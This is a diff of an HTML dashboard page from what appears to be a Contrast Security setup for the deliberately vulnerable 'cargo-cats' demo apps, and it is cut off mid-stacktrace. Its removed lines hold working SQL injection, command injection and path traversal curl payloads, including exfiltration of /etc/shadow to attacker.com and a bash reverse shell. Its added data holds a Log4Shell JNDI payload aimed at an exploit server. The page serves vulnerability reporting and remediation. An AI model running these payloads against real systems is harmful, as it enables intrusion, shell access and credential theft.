@@ -296,390 +296,184 @@
         .tab-content.active {
             display: block;
         }
+        .source-bar { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; margin-bottom: 20px; font-size: 0.95em; }
+        .source-badge { padding: 3px 12px; border-radius: 12px; font-weight: bold; font-size: 0.85em; }
+        .source-badge.live { background: #00c878; color: #0a0e27; }
+        .source-badge.mock { background: #ffaa00; color: #0a0e27; }
+        .refresh-btn { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; border: 0; border-radius: 8px; padding: 8px 18px; cursor: pointer; font-size: 0.95em; }
+        .error-banner { display: none; background: rgba(255, 68, 68, 0.15); border: 2px solid #ff4444; border-radius: 10px; padding: 16px 20px; margin-bottom: 20px; }
+        .picker { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; margin-bottom: 28px; }
+        .picker select { background: #1a1f3a; color: #fff; border: 2px solid rgba(102,126,234,0.5); border-radius: 8px; padding: 10px 14px; font-size: 1em; min-width: 520px; max-width: 100%; }
+        .picker label { color: #8fa2ff; font-weight: bold; }
+        .copy-btn { background: rgba(102,126,234,0.3); color: #cfd8ff; border: 1px solid rgba(102,126,234,0.6); border-radius: 6px; padding: 4px 12px; font-size: 0.8em; cursor: pointer; float: right; }
+        .severity-medium { background: #ffaa00; color: #1a1f3a; }
+        .severity-low { background: #4488ff; color: #fff; }
+        .severity-note { background: #8892b0; color: #fff; }
     </style>
 </head>
 <body>
     <div class="container">
-        <header>
-            <h1>🔬 Vulnerability Proof-of-Concept Generator</h1>
-            <p>Validate and demonstrate security vulnerabilities with generated exploit requests</p>
-        </header>
+        <a href="index.html" style="display:inline-block;margin-bottom:20px;color:#667eea;text-decoration:none;font-weight:bold;">← Back to Reports</a>
 
-        <!-- SQL Injection PoC -->
-        <div class="vuln-card">
-            <div class="vuln-header">
-                <div class="vuln-title">
-                    <h2>SQL Injection from "creditCard", "shipmentId" Parameters</h2>
-                    <div class="vuln-id">VULN-ID: SALY-Y689-EXC0-CQLC</div>
-                </div>
-                <div class="severity-badge severity-critical">Critical</div>
-            </div>
+        <h1>🔬 Vulnerability Proof-of-Concept Generator</h1>
+        <p style="opacity:.85;margin-bottom:24px;">Reproduction details for any finding in your Contrast organization</p>
 
-            <div class="vuln-meta">
-                <div class="meta-item">
-                    <div class="meta-label">Application</div>
-                    <div class="meta-value">cargo-cats-dataservice</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Route</div>
-                    <div class="meta-value">/payments</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Method</div>
-                    <div class="meta-value">GET</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Environment</div>
-                    <div class="meta-value">DEVELOPMENT</div>
-                </div>
-            </div>
+        <div class="source-bar">
+            <div><span id="sourceBadge" class="source-badge mock">Loading</span> <span id="updated"></span></div>
+            <button class="refresh-btn" id="refreshBtn">↻ Refresh</button>
+        </div>
+        <div class="error-banner" id="errorBanner"></div>
 
-            <div class="alert alert-danger">
-                <div class="alert-icon">⚠️</div>
-                <div>
-                    <strong>Security Risk:</strong> This SQL injection vulnerability allows an attacker to manipulate database queries,
-                    potentially exposing sensitive data, modifying records, or executing administrative operations.
-                </div>
-            </div>
-
-            <h3 class="section-title">📋 Proof-of-Concept Steps</h3>
-            <div class="poc-steps">
-                <div class="step">
-                    <div class="step-number">1</div>
-                    <div class="step-content">
-                        <h4>Identify Vulnerable Parameters</h4>
-                        <p>The vulnerability exists in the <code>creditCard</code> and <code>shipmentId</code> query parameters on the <code>/payments</code> endpoint.</p>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <div class="step-content">
-                        <h4>Review Original Request</h4>
-                        <p>The original HTTP request that triggered the vulnerability detection:</p>
-                        <div class="code-block http-request">
-                            <pre>GET /payments?creditCard=contrast-redacted-financial-info&shipmentId=1 HTTP/1.1
-Accept: application/json
-Connection: keep-alive
-Host: dataservice:8080
-User-Agent: Java/11.0.29</pre>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <div class="step-content">
-                        <h4>Generate Exploit Request</h4>
-                        <p>Craft a SQL injection payload to demonstrate the vulnerability:</p>
-                        <div class="curl-command">
-                            <code>curl -X GET "http://dataservice:8080/payments?creditCard=1234' OR '1'='1&shipmentId=1' UNION SELECT password FROM users--" \
-  -H "Accept: application/json" \
-  -H "User-Agent: PoC-Generator"</code>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">4</div>
-                    <div class="step-content">
-                        <h4>Validate Exploitation</h4>
-                        <p>Execute the request and examine the response. A successful SQL injection would return:</p>
-                        <ul style="margin-top: 10px; margin-left: 20px;">
-                            <li>Unauthorized data from the database</li>
-                            <li>Database error messages revealing schema information</li>
-                            <li>Modified application behavior indicating query manipulation</li>
-                        </ul>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">5</div>
-                    <div class="step-content">
-                        <h4>Document Findings</h4>
-                        <p>Record the full HTTP request and response to provide evidence of the vulnerability to the development team.</p>
-                    </div>
-                </div>
-            </div>
-
-            <h3 class="section-title">🎯 Alternative Exploitation Techniques</h3>
-            <div class="tabs">
-                <div class="tab active" onclick="switchTab(event, 'boolean-sql')">Boolean-Based Blind</div>
-                <div class="tab" onclick="switchTab(event, 'union-sql')">UNION-Based</div>
-                <div class="tab" onclick="switchTab(event, 'time-sql')">Time-Based Blind</div>
-            </div>
-
-            <div class="tab-content active" id="boolean-sql">
-                <div class="curl-command">
-                    <code># Test for true condition
-curl "http://dataservice:8080/payments?creditCard=1234' AND '1'='1&shipmentId=1" -s | wc -c
-
-# Test for false condition
-curl "http://dataservice:8080/payments?creditCard=1234' AND '1'='2&shipmentId=1" -s | wc -c
-
-# Different response sizes indicate SQL injection vulnerability</code>
-                </div>
-            </div>
-
-            <div class="tab-content" id="union-sql">
-                <div class="curl-command">
-                    <code># Extract database version
-curl "http://dataservice:8080/payments?creditCard=1234' UNION SELECT @@version--&shipmentId=1"
-
-# Extract table names
-curl "http://dataservice:8080/payments?creditCard=1234' UNION SELECT table_name FROM information_schema.tables--&shipmentId=1"</code>
-                </div>
-            </div>
-
-            <div class="tab-content" id="time-sql">
-                <div class="curl-command">
-                    <code># Time-based detection
-curl "http://dataservice:8080/payments?creditCard=1234' AND SLEEP(5)--&shipmentId=1" -w "Time: %{time_total}s\n"
-
-# Response time > 5 seconds indicates vulnerability</code>
-                </div>
-            </div>
-
-            <h3 class="section-title">🔍 Vulnerable Code Location</h3>
-            <div class="alert alert-warning">
-                <div class="alert-icon">⚡</div>
-                <div>
-                    <strong>Vulnerable File:</strong> PaymentController.java:55 in executeRawQuery() method
-                </div>
-            </div>
-
-            <div class="code-block stacktrace">
-                <div class="stack-frame vulnerable-frame">com.contrast.dataservice.PaymentController.executeRawQuery(PaymentController.java:55)</div>
-                <div class="stack-frame">org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:444)</div>
-                <div class="stack-frame">org.springframework.jdbc.core.JdbcTemplate.execute(JdbcTemplate.java:393)</div>
-                <div class="stack-frame">org.springframework.jdbc.core.JdbcTemplate$1ExecuteStatementCallback.doInStatement(JdbcTemplate.java:435)</div>
-                <div class="stack-frame">com.zaxxer.hikari.pool.HikariProxyStatement.execute()</div>
-            </div>
+        <div class="picker">
+            <label for="vulnSelect">Vulnerability</label>
+            <select id="vulnSelect"></select>
         </div>
 
-        <!-- Command Injection PoC -->
-        <div class="vuln-card">
-            <div class="vuln-header">
-                <div class="vuln-title">
-                    <h2>OS Command Injection from Request Body</h2>
-                    <div class="vuln-id">VULN-ID: DXF8-3N0U-UGTV-R74V</div>
-                </div>
-                <div class="severity-badge severity-high">High</div>
-            </div>
-
-            <div class="vuln-meta">
-                <div class="meta-item">
-                    <div class="meta-label">Application</div>
-                    <div class="meta-value">cargo-cats-webhookservice</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Route</div>
-                    <div class="meta-value">/testConnection</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Method</div>
-                    <div class="meta-value">POST</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Language</div>
-                    <div class="meta-value">Python</div>
-                </div>
-            </div>
-
-            <div class="alert alert-danger">
-                <div class="alert-icon">💥</div>
-                <div>
-                    <strong>Security Risk:</strong> OS Command Injection allows attackers to execute arbitrary system commands,
-                    potentially leading to complete system compromise, data theft, or service disruption.
-                </div>
-            </div>
-
-            <h3 class="section-title">📋 Proof-of-Concept Steps</h3>
-            <div class="poc-steps">
-                <div class="step">
-                    <div class="step-number">1</div>
-                    <div class="step-content">
-                        <h4>Original Request Pattern</h4>
-                        <div class="code-block http-request">
-                            <pre>POST /testConnection HTTP/1.1
-Accept: application/json
-Host: webhookservice:5000
-Content-Type: application/json
-Content-Length: 30
-
-contrast-redacted-body</pre>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <div class="step-content">
-                        <h4>Command Injection Payload</h4>
-                        <p>Inject OS commands through the request body parameter:</p>
-                        <div class="curl-command">
-                            <code>curl -X POST "http://webhookservice:5000/testConnection" \
-  -H "Content-Type: application/json" \
-  -H "Accept: application/json" \
-  -d '{"url": "https://example.com; cat /etc/passwd"}'</code>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <div class="step-content">
-                        <h4>Advanced Exploitation</h4>
-                        <p>Chain multiple commands to demonstrate full system access:</p>
-                        <div class="curl-command">
-                            <code># Exfiltrate sensitive data
-curl -X POST "http://webhookservice:5000/testConnection" \
-  -H "Content-Type: application/json" \
-  -d '{"url": "https://example.com; curl -X POST https://attacker.com/steal -d @/etc/shadow"}'
-
-# Reverse shell payload
-curl -X POST "http://webhookservice:5000/testConnection" \
-  -H "Content-Type: application/json" \
-  -d '{"url": "https://example.com; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}'</code>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <h3 class="section-title">🔍 Vulnerable Code Location</h3>
-            <div class="alert alert-warning">
-                <div class="alert-icon">⚡</div>
-                <div>
-                    <strong>Vulnerable File:</strong> app.py:284 in test_connection() method
-                </div>
-            </div>
-
-            <div class="code-block stacktrace">
-                <div class="stack-frame vulnerable-frame">app.py, line 284, in test_connection()</div>
-                <div class="stack-frame">subprocess.py, line 505, in run()</div>
-                <div class="stack-frame">flask.app.py, line 1469, in dispatch_request()</div>
-                <div class="stack-frame">flask.app.py, line 1484, in full_dispatch_request()</div>
-            </div>
-        </div>
-
-        <!-- Path Traversal PoC -->
-        <div class="vuln-card">
-            <div class="vuln-header">
-                <div class="vuln-title">
-                    <h2>Path Traversal from "path" Parameter</h2>
-                    <div class="vuln-id">VULN-ID: 3VQ2-N6XF-GS7K-MCKF</div>
-                </div>
-                <div class="severity-badge severity-high">High</div>
-            </div>
-
-            <div class="vuln-meta">
-                <div class="meta-item">
-                    <div class="meta-label">Application</div>
-                    <div class="meta-value">cargo-cats-imageservice</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Route</div>
-                    <div class="meta-value">/getphoto</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Method</div>
-                    <div class="meta-value">GET</div>
-                </div>
-                <div class="meta-item">
-                    <div class="meta-label">Language</div>
-                    <div class="meta-value">C# / .NET</div>
-                </div>
-            </div>
-
-            <div class="alert alert-danger">
-                <div class="alert-icon">📁</div>
-                <div>
-                    <strong>Security Risk:</strong> Path Traversal vulnerabilities allow attackers to access files outside the intended directory,
-                    potentially exposing configuration files, credentials, or application source code.
-                </div>
-            </div>
-
-            <h3 class="section-title">📋 Proof-of-Concept Steps</h3>
-            <div class="poc-steps">
-                <div class="step">
-                    <div class="step-number">1</div>
-                    <div class="step-content">
-                        <h4>Baseline Request</h4>
-                        <div class="code-block http-request">
-                            <pre>GET /getphoto?path=cat.jpg HTTP/1.1
-Host: imageservice
-Accept: application/octet-stream, application/json
-User-Agent: Java/11.0.29</pre>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">2</div>
-                    <div class="step-content">
-                        <h4>Directory Traversal Exploits</h4>
-                        <div class="curl-command">
-                            <code># Access /etc/passwd (Linux)
-curl "http://imageservice/getphoto?path=../../../../etc/passwd"
-
-# Access web.config (Windows)
-curl "http://imageservice/getphoto?path=..\\..\\..\\..\\web.config"
-
-# Access application secrets
-curl "http://imageservice/getphoto?path=../../appsettings.json"</code>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="step">
-                    <div class="step-number">3</div>
-                    <div class="step-content">
-                        <h4>Encoding Bypass Techniques</h4>
-                        <div class="curl-command">
-                            <code># URL encoding
-curl "http://imageservice/getphoto?path=..%2F..%2F..%2Fetc%2Fpasswd"
-
-# Double URL encoding
-curl "http://imageservice/getphoto?path=%252e%252e%252f%252e%252e%252fetc%252fpasswd"
-
-# Unicode encoding
-curl "http://imageservice/getphoto?path=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"</code>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <h3 class="section-title">🔍 Vulnerable Code Location</h3>
-            <div class="alert alert-warning">
-                <div class="alert-icon">⚡</div>
-                <div>
-                    <strong>Vulnerable File:</strong> Program.cs:99 in file read operation
-                </div>
-            </div>
-
-            <div class="code-block stacktrace">
-                <div class="stack-frame vulnerable-frame">Program.&lt;&gt;c__DisplayClass0_0.&lt;&lt;Main&gt;$&gt;b__2(Program.cs:99)</div>
-                <div class="stack-frame">System.IO.File.ReadAllBytes()</div>
-                <div class="stack-frame">System.IO.File.OpenHandle()</div>
-                <div class="stack-frame">Microsoft.Win32.SafeHandles.SafeFileHandle.Open()</div>
-            </div>
-        </div>
-
-        <a href="index.html" class="back-link">← Back to Reports</a>
+        <div id="detail"></div>
     </div>
 
+    <script>window.FROZEN_DATA = {"capturedAt":"2026-10-21T18:46:30.906Z","payload":{"source":"live","generatedAt":"2026-10-21T18:47:00.449Z","list":[{"id":"4969-OAI2-GRZX-XIHA","title":"JNDI Injection from \"username\" Parameter in org.springframework.security.web.header.HeaderWriterFilter.doFilter(javax.servlet.ServletRequest,javax.servlet.ServletResponse,javax.servlet.FilterChain)","type":"jndi-injection","severity":"Critical","app":"SAML-cargocats-frontgateservice","appId":"2c2c2998-e96c-4f40-8171-ae2b033f2ddb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:46:00+00:00","lastSeenAt":"2026-10-13T13:46:00+00:00","closedAt":null},{"id":"GCSV-O96H-57N1-VOBC","title":"SQL Injection from \"creditCard\" Parameter, \"shipmentId\" Parameter on \"/payments\" page","type":"sql-injection","severity":"Critical","app":"SAML-cargocats-dataservice","appId":"84cb3ae3-42bf-41c9-b77b-980319602dad","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:46:00+00:00","lastSeenAt":"2026-10-13T13:46:00+00:00","closedAt":null},{"id":"ANYQ-QBD6-HMW8-XJJV","title":"OS Command Injection from \"template\" Parameter on \"/template\" page","type":"cmd-injection","severity":"High","app":"SAML-cargocats-reportservice","appId":"3b65e748-6ee5-40e7-9848-b1429d4de613","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:46:00+00:00","lastSeenAt":"2026-10-13T13:46:00+00:00","closedAt":null},{"id":"PXH0-Y11W-5MA1-ZQUM","title":"OS Command Injection from Request Body on \"/testConnection\" page","type":"cmd-injection","severity":"High","app":"SAML-cargocats-webhookservice","appId":"8c909556-4a56-48a1-971c-bf376dc0bbcc","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:08:00+00:00","lastSeenAt":"2026-10-13T13:46:00+00:00","closedAt":null},{"id":"QW39-EJ3I-V76Z-NSS6","title":"Unsafe Code Execution from Untrusted Sources on \"/generate-label\" page","type":"unsafe-code-execution","severity":"High","app":"SAML-cargocats-labelservice","appId":"bfb73036-2d10-4989-babc-454cd35ee1fb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:46:00+00:00","lastSeenAt":"2026-10-13T13:46:00+00:00","closedAt":null},{"id":"ZO8W-RDZN-UZ3M-98XK","title":"Untrusted Deserialization from Request Body on \"/api/addresses/import\" page","type":"untrusted-deserialization","severity":"High","app":"SAML-cargocats-frontgateservice","appId":"2c2c2998-e96c-4f40-8171-ae2b033f2ddb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:46:00+00:00","lastSeenAt":"2026-10-13T13:46:00+00:00","closedAt":null},{"id":"PEJ6-JXV9-C408-M6MT","title":"'MD5' hash algorithm used at Digester.java","type":"crypto-bad-mac","severity":"Medium","app":"SAML-cargocats-dataservice","appId":"84cb3ae3-42bf-41c9-b77b-980319602dad","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T12:58:00+00:00","lastSeenAt":"2026-10-19T14:38:00+00:00","closedAt":null},{"id":"PVEC-ZGW6-2BOH-G76L","title":"'MD5' hash algorithm used at Digester.java","type":"crypto-bad-mac","severity":"Medium","app":"SAML-cargocats-frontgateservice","appId":"2c2c2998-e96c-4f40-8171-ae2b033f2ddb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T12:58:00+00:00","lastSeenAt":"2026-10-19T14:38:00+00:00","closedAt":null},{"id":"W7MI-Y8AI-GAMZ-VFQS","title":"'SHA' hash algorithm used at SessionIdGeneratorBase.java","type":"crypto-bad-mac","severity":"Medium","app":"SAML-cargocats-reportservice","appId":"3b65e748-6ee5-40e7-9848-b1429d4de613","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T12:59:00+00:00","lastSeenAt":"2026-10-19T14:38:00+00:00","closedAt":null},{"id":"2ZTA-6MC9-S0QC-0TZC","title":"'SHA' hash algorithm used at SessionIdGeneratorBase.java","type":"crypto-bad-mac","severity":"Medium","app":"SAML-cargocats-frontgateservice","appId":"2c2c2998-e96c-4f40-8171-ae2b033f2ddb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:07:00+00:00","lastSeenAt":"2026-10-13T13:07:00+00:00","closedAt":null},{"id":"4UU5-MWGG-P8WI-03UO","title":"Application Disables 'secure' Flag on Cookies observed at Response.java (JSESSIONID)","type":"cookie-flags-missing","severity":"Medium","app":"SAML-cargocats-frontgateservice","appId":"2c2c2998-e96c-4f40-8171-ae2b033f2ddb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:07:00+00:00","lastSeenAt":"2026-10-13T13:46:00+00:00","closedAt":null},{"id":"QRXT-HH6T-BRPW-3QG0","title":"Cross-Site Scripting from \"trackingId\" Parameter on \"/api/shipments/track\" page","type":"reflected-xss","severity":"Medium","app":"SAML-cargocats-frontgateservice","appId":"2c2c2998-e96c-4f40-8171-ae2b033f2ddb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:11:00+00:00","lastSeenAt":"2026-10-13T13:46:00+00:00","closedAt":null},{"id":"YTZY-2BUU-5WJK-H06B","title":"Session Cookie Has No 'HttpOnly' Flag in Response.java","type":"httponly","severity":"Medium","app":"SAML-cargocats-frontgateservice","appId":"2c2c2998-e96c-4f40-8171-ae2b033f2ddb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:07:00+00:00","lastSeenAt":"2026-10-13T13:46:00+00:00","closedAt":null},{"id":"AJ1O-WDSR-E9N3-S7XL","title":"Session Cookie Has No 'secure' Flag in the session 71f7e73543982bfce9f9aa443160ae60 defined in /app/app.py","type":"secure-flag-missing","severity":"Medium","app":"SAML-cargocats-webhookservice","appId":"8c909556-4a56-48a1-971c-bf376dc0bbcc","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:08:00+00:00","lastSeenAt":"2026-10-13T13:08:00+00:00","closedAt":null},{"id":"P0JL-1CA7-QNZJ-7OOW","title":"Session Cookie Has No 'secure' Flag in the session c4a6cb3d2c8aa0caa1ba51b143d1fb6f defined in /app/app.py","type":"secure-flag-missing","severity":"Medium","app":"SAML-cargocats-docservice","appId":"55404d90-2ab9-406a-9ab4-bfec04a68287","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:46:00+00:00","lastSeenAt":"2026-10-13T13:46:00+00:00","closedAt":null},{"id":"DNNT-DR0J-3RZX-R8W9","title":"Trust Boundary Violation from URI in org.springframework.security.web.header.HeaderWriterFilter.doFilter(javax.servlet.ServletRequest,javax.servlet.ServletResponse,javax.servlet.FilterChain)","type":"trust-boundary-violation","severity":"Medium","app":"SAML-cargocats-frontgateservice","appId":"2c2c2998-e96c-4f40-8171-ae2b033f2ddb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:07:00+00:00","lastSeenAt":"2026-10-13T13:15:00+00:00","closedAt":null},{"id":"QA9D-WUPS-KHD1-KDJ3","title":"Unchecked Spring Autobinding in com.contrast.frontgateservice.entity.User class","type":"spring-unchecked-autobinding","severity":"Medium","app":"SAML-cargocats-frontgateservice","appId":"2c2c2998-e96c-4f40-8171-ae2b033f2ddb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:07:00+00:00","lastSeenAt":"2026-10-13T13:15:00+00:00","closedAt":null},{"id":"ZK8X-4P6G-U17L-3WZ5","title":"Overly Long Session Timeout in the session 71f7e73543982bfce9f9aa443160ae60 defined in /app/app.py","type":"session-timeout","severity":"Low","app":"SAML-cargocats-webhookservice","appId":"8c909556-4a56-48a1-971c-bf376dc0bbcc","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:08:00+00:00","lastSeenAt":"2026-10-13T13:08:00+00:00","closedAt":null},{"id":"AMY1-E81V-DW6L-3QFL","title":"Overly Long Session Timeout in the session c4a6cb3d2c8aa0caa1ba51b143d1fb6f defined in /app/app.py","type":"session-timeout","severity":"Low","app":"SAML-cargocats-docservice","appId":"55404d90-2ab9-406a-9ab4-bfec04a68287","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:46:00+00:00","lastSeenAt":"2026-10-13T13:46:00+00:00","closedAt":null},{"id":"D579-ZBIT-BN4S-ZEDU","title":"X-Powered-By Header Enabled in Route","type":"x-powered-by-header","severity":"Low","app":"SAML-cargocats-labelservice","appId":"bfb73036-2d10-4989-babc-454cd35ee1fb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:46:00+00:00","lastSeenAt":"2026-10-13T13:46:00+00:00","closedAt":null},{"id":"ZDPO-Z2FJ-1SZS-BHXJ","title":"Anti-Caching Controls Missing detected","type":"cache-controls-missing","severity":"Note","app":"SAML-cargocats-dataservice","appId":"84cb3ae3-42bf-41c9-b77b-980319602dad","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:07:00+00:00","lastSeenAt":"2026-10-13T13:46:00+00:00","closedAt":null},{"id":"1BUA-DB63-7FRZ-HD12","title":"Anti-Caching Controls Missing detected","type":"cache-controls-missing","severity":"Note","app":"SAML-cargocats-reportservice","appId":"3b65e748-6ee5-40e7-9848-b1429d4de613","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:08:00+00:00","lastSeenAt":"2026-10-13T13:15:00+00:00","closedAt":null},{"id":"DMGX-SCCX-FZ6F-CD52","title":"Anti-Caching Controls Missing detected","type":"cache-controls-missing","severity":"Note","app":"SAML-cargocats-frontgateservice","appId":"2c2c2998-e96c-4f40-8171-ae2b033f2ddb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:09:00+00:00","lastSeenAt":"2026-10-13T13:15:00+00:00","closedAt":null},{"id":"SDNK-U6LB-CNKE-0HCF","title":"Forms Without Autocomplete Prevention detected","type":"autocomplete-missing","severity":"Note","app":"SAML-cargocats-frontgateservice","appId":"2c2c2998-e96c-4f40-8171-ae2b033f2ddb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T12:52:00+00:00","lastSeenAt":"2026-10-21T18:43:00+00:00","closedAt":null},{"id":"GAOV-ZGTH-RNPP-BYCT","title":"Pages Without Anti-Clickjacking Controls detected","type":"clickjacking-control-missing","severity":"Note","app":"SAML-cargocats-labelservice","appId":"bfb73036-2d10-4989-babc-454cd35ee1fb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:46:00+00:00","lastSeenAt":"2026-10-13T13:46:00+00:00","closedAt":null},{"id":"CXNX-MP6V-V91O-OIG1","title":"Pages Without Anti-Clickjacking Controls detected","type":"clickjacking-control-missing","severity":"Note","app":"SAML-cargocats-frontgateservice","appId":"2c2c2998-e96c-4f40-8171-ae2b033f2ddb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:11:00+00:00","lastSeenAt":"2026-10-13T13:11:00+00:00","closedAt":null},{"id":"1Y7H-P0OM-ZSY0-8H9H","title":"Parameter Pollution detected","type":"parameter-pollution","severity":"Note","app":"SAML-cargocats-frontgateservice","appId":"2c2c2998-e96c-4f40-8171-ae2b033f2ddb","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:07:00+00:00","lastSeenAt":"2026-10-21T14:47:00+00:00","closedAt":null}],"detail":{"id":"4969-OAI2-GRZX-XIHA","appId":"2c2c2998-e96c-4f40-8171-ae2b033f2ddb","app":"SAML-cargocats-frontgateservice","title":"JNDI Injection from \"username\" Parameter in org.springframework.security.web.header.HeaderWriterFilter.doFilter(javax.servlet.ServletRequest,javax.servlet.ServletResponse,javax.servlet.FilterChain)","type":"jndi-injection","severity":"Critical","status":"Reported","environments":["QA"],"firstSeenAt":"2026-10-13T13:46:00+00:00","lastSeenAt":"2026-10-13T13:46:00+00:00","httpRequest":"POST /login HTTP/1.1\nAccept: */*\nAccept-Encoding: gzip, deflate\nContent-Length: 124\nContent-Type: application/x-www-form-urlencoded\nHost: cargocats.localhost\nUser-Agent: python-requests/2.31.0\nX-Forwarded-Host: cargocats.localhost\nX-Forwarded-Port: 80\nX-Forwarded-Proto: http\nX-Forwarded-Scheme: http\nX-Real-Ip: 10.1.12.234\nX-Request-Id: e1516242c189e377689d90ac20894315\nX-Scheme: http\n\nusername=${jndi:ldap://exploit-server:1389/serial/CommonsCollections2/sleep/1000}&password=contrast-redacted-authentication-info","howToFix":"Untrusted data should never be used in a Java Naming and Directory Interface (JNDI) lookup. If your application requires dynamic JNDI lookups, then restrict those lookups to a known set of safe values using a validator function.\n\n```java\n// DynamicJNDILookup.java\nvoid validateName(String name) {\n  if (!allowedNames.contains(name)) {\n    throw new IllegalArgumentException(name + \" is not an allowed name for JNDI lookups\");\n  }\n}\n```\n\n```java\n// DynamicJNDILookup.java\nString name = request.getParameter(\"name\");\nContext context = new InitialContext();\nvalidateName(name);\nObject result = context.lookup(name);\n```\n\nAssess users should take care to add a validator such as `validateName` as a Security Control, to make Assess aware that this custom code validates that lookups are safe from JNDI injection vulnerabilities.","remediationHint":"Where a vulnerable library exists in the stacktrace and it looks like that library may be the cause of the underlying vulnerability, prioritise upgrading that library but only fix the vulnerability explicitly asked by the developer\nMove the sanitisation/validation logic into a separate method to make it easier to add as a security control if needed.\nIf the fix does not break the data flow between user input and sink and doesnt use well known libraries, you MUST give the user documentation on how to add a security control. Do not forget to inform the developer of this as you fix the vulnerability.\nIf including regular expressions as a suggested fix, please advise that Contrast requires configuration via Security Controls in order to recognize this fix. Documentation for Security Controls is available at https://docs.contrastsecurity.com/en/security-controls.html\nPrefer to use industry best practices in remediating vulnerabilities from reputable sources like OWASP.\nWhen using libraries for validation ensure they're well known and maintained e.g. like dompurify, esapi, etc.","stackTrace":["java.naming/javax.naming.InitialContext.lookup()","org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)","org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)","org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:221)","org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1110)","org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1033)","org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912)","org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:467)","org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132)","org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38)","org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:344)","org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244)","org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229)","org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59)","org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197)","org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190)","org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181)","org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156)","org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129)","org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120)","org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84)","org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:540)","org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:498)","org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:481)","org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:456)","org.apache.logging.log4j.core.config.AwaitCompletionReliabilityStrategy.log(AwaitCompletionReliabilityStr